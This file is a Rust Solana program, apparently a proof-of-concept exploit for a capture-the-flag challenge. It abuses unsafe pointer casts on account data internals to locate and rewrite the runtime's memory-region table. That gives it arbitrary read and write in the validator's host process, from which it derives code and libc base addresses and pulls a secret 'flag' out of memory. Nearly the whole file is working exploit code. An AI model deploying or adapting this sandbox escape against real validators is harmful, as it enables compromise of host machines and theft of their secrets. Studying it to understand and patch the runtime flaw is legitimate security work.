use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program::invoke_signed,
    pubkey::Pubkey,
    system_instruction,
    system_program,
    program_error::ProgramError,
    program::invoke_unchecked,
    program::invoke,
    instruction::{AccountMeta, Instruction},
};
use solana_program::sysvar::Sysvar;
use solana_program::sysvar::rent::Rent;
use std::{alloc::System, clone, rc::{self, Rc}};
use borsh::{BorshSerialize, BorshDeserialize};
use std::cell::{RefCell, Ref};
use core::ptr;
#[macro_use] extern crate t_bang;
use t_bang::*;

#[derive(BorshSerialize, BorshDeserialize, Debug)]
pub struct MyData {
    pub value:Vec<u8>
}

entrypoint!(process_instruction);

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("poc start");
    let accounts_iter: &mut std::slice::Iter<'_, AccountInfo<'_>> = &mut accounts.iter();
    let receiver: &AccountInfo<'_> = next_account_info(accounts_iter)?;
    let payer: &AccountInfo<'_> = next_account_info(accounts_iter)?;
    let victim: &AccountInfo<'_> = next_account_info(accounts_iter)?;
    let _pda: &AccountInfo<'_> = next_account_info(accounts_iter)?;
    let callee: &AccountInfo<'_> = next_account_info(accounts_iter)?;

    let (pda, bump_seed) = Pubkey::find_program_address(
        &[b"seed"],
        program_id,
    );
    
    {
        let buffer = vec![62u8; 0x100];
        let mut data = victim.data.borrow_mut();
        data[..buffer.len()].copy_from_slice(&buffer);
    }

    let accounts_for_b = vec![payer.clone()];
    let instruction = Instruction::new_with_borsh(
        *callee.key, 
        &_instruction_data, 
        vec![ AccountMeta::new(*payer.key, true)]
    );
    invoke_signed(
        &instruction,
        &accounts_for_b,
        &[&[b"seed", &[bump_seed]]],
    )?;
    unsafe {
        let rc_victim_ptr = Rc::as_ptr(&victim.data) as *mut RefCell<&mut [u8]>;
        let v_ptr    = rc_victim_ptr as *mut u64 ;
        
        let rc_payer_ptr = Rc::as_ptr(&payer.data) as *mut RefCell<&mut [u8]>;
        let p_ptr    = rc_payer_ptr as *mut u64 ;

        let rc_recevier_ptr = Rc::as_ptr(&receiver.data) as *mut RefCell<&mut [u8]>;
        let r_ptr    = rc_recevier_ptr as *mut u64 ;

        let r_data_ptr = *(r_ptr.wrapping_add(1)) as *mut u64;
        let p_data_ptr = *(p_ptr.wrapping_add(1)) as *mut u64;

        let v_data_ptr = *(v_ptr.wrapping_add(1)) as *mut u64;

        let receiver_region_vm_start = searchMem(r_data_ptr,0x0000000400000060,0x0000000400100060,0x100000,0x90000,0x0000000400105220,0x0000000400105320);
    
        if receiver_region_vm_start != ptr::null_mut(){
            let receiver_region_addr = receiver_region_vm_start.offset(-1);
            msg!("memory region of 0x0000000400000060 at {:#x}", receiver_region_addr as u64);
            dumpMem(receiver_region_addr,0x50);

            let victim_region_addr = receiver_region_addr.offset(0x10);
            let victim_region_host = *(victim_region_addr.offset(0));
            let victim_vm_start    = *(victim_region_addr.offset(1));
            let victim_vm_end      = *(victim_region_addr.offset(2));

            let code_base          = *(victim_region_addr.offset(7))-0x00000000038d8071-0x380+0xe10-0x940;
            let libc_got               = 0x0000000005b56130+code_base -0x940;
            let libc_base = read(victim_region_addr, v_data_ptr, libc_got)-0x0000000000558b60;

            if libc_base&0xffffffff00000000 != 0x3e3e3e3e00000000 {
                let flag_vec = 0x0000000005c5e0e8+code_base;
                let flag_len =  read(victim_region_addr, v_data_ptr,flag_vec);
                let flag_addr = read(victim_region_addr, v_data_ptr,flag_vec+8);
                msg!("code_base          : {:#x} ", code_base);
                msg!("victim_region_host : {:#x}", victim_region_host);
                msg!("victim_vm_start    : {:#x} victim_vm_end: {:#x}", victim_vm_start, victim_vm_end);
                msg!("libc_got: {:#x}", libc_got);
                msg!("libc_base: {:#x}", libc_base);
                msg!("flag_addr: {:#x}", flag_addr);

                let mut flag_data = Vec::new();
                let num_full_chunks = flag_len / 8;
                let remaining_bytes = flag_len % 8;

                for i in 0..num_full_chunks {
                    let offset = flag_addr + i * 8; 
                    let c: u64 = read(victim_region_addr, v_data_ptr, offset);
                    flag_data.push(c); 
                }

                if remaining_bytes > 0 {
                    let offset = flag_addr + num_full_chunks * 8; 
                    let mut remaining_data = [0u8; 8];
                    let read_bytes = read(victim_region_addr, v_data_ptr, offset); 

                    let read_bytes_slice = &read_bytes.to_le_bytes()[..remaining_bytes as usize];
                    remaining_data[..remaining_bytes as usize].copy_from_slice(read_bytes_slice);
                    
                    flag_data.push(u64::from_le_bytes(remaining_data));
                }

                let mut bytes = Vec::new();
                for &value in &flag_data {
                    bytes.extend(&value.to_le_bytes()); 
                }

                let flag = String::from_utf8(bytes.clone())
                    .expect("Failed to convert bytes to String");

                msg!("flag: {}", flag);

                {
                    let bytes = flag.as_bytes();
                        let mut data = payer.data.borrow_mut();
                        data[..bytes.len()].copy_from_slice(&bytes);
                }
            }else{
                {
                    let libc_base: u64 = 0x3e3e3e3e3e3e3e3e;
                    let bytes = libc_base.to_be_bytes(); 
                    let mut data = payer.data.borrow_mut();
                    data[..bytes.len()].copy_from_slice(&bytes);
                }
            }
            
        }else{
            {
                    let libc_base: u64 = 0x3e3e3e3e3e3e3e3e;
                    let bytes = libc_base.to_be_bytes(); 
                    let mut data = payer.data.borrow_mut();
                    data[..bytes.len()].copy_from_slice(&bytes);
            }
        }
        
    }

    msg!("poc over");
    Ok(())
}

fn read(victim_region_addr: *mut u64, v_data_ptr:*mut u64, victim_addr: u64)-> u64{
    unsafe{
        let original_victim_host_addr = *victim_region_addr;
        *(victim_region_addr.offset(0)) = victim_addr;
        let value = *(v_data_ptr.offset(0));
        *(victim_region_addr.offset(0)) = original_victim_host_addr;
        return value;
    }
}

fn write(victim_region_addr: *mut u64, v_data_ptr:*mut u64, victim_addr: u64, value: u64){
    unsafe{
        let original_victim_host_addr = *victim_region_addr;
        *(victim_region_addr.offset(0)) = victim_addr;
        *(v_data_ptr.offset(0)) = value;
        *(victim_region_addr.offset(0)) = original_victim_host_addr;
    }
}

fn searchMem(addr: *mut u64, vm_addr: u64, vm_end: u64, vm_len:u64, len: isize, magic_start:u64, magic_end:u64) -> *mut u64 {
    if len < 16 {
        msg!("Search length too short to contain vm_addr and vm_end.");
        return ptr::null_mut();
    }
    let num_u64s = len / 8;
    msg!("Searching {} u64 values starting at memory address {:#?}...", num_u64s, addr);
    unsafe {
        for i in 0..(num_u64s.saturating_sub(1)) {
            let current_ptr = addr.offset(i);
            let next_ptr    = current_ptr.offset(1);
            let n_next_ptr  = current_ptr.offset(2);
            let magic_start_ptr = current_ptr.offset(16);
            let magic_end_ptr   = current_ptr.offset(17);
            if (current_ptr as *const u8) > (addr as *const u8).add(len as usize - 8) || 
               (next_ptr as *const u8) > (addr as *const u8).add(len as usize - 8) { 
                 msg!("Warning: Pointer {:#?} or {:#?} out of safe search range, stopping search.", current_ptr, next_ptr);
                 break;
            }
            let val1 = *current_ptr;
            let val2 = *next_ptr;
            let val3 = *n_next_ptr;
            let magic_start_val = *magic_start_ptr;
            let magic_end_val = *magic_end_ptr;

            if val1 == vm_addr && val2 == vm_end && val3 == vm_len && magic_start_val == magic_start && magic_end_val == magic_end {
                msg!(
                    "Target sequence {:#x} and {:#x} found at offset {:#x} from base address {:#?}",
                    vm_addr,
                    vm_end,
                    i * 8,
                    addr
                );
                return current_ptr;
            }
        }
    } 
    msg!("Search of specified memory region complete. Target sequence not found.");
    return ptr::null_mut();
}


fn dumpMem(addr: *mut u64, len: isize) {
    msg!("\n");
    for i in 0..len {
        unsafe { 
            if i%2 == 0{
                msg!("{:?}: {:>016x} {:>016x}", addr.offset(i), *(addr.offset(i)), *(addr.offset(i+1)));
            }
        };
    }
    msg!("\n")
}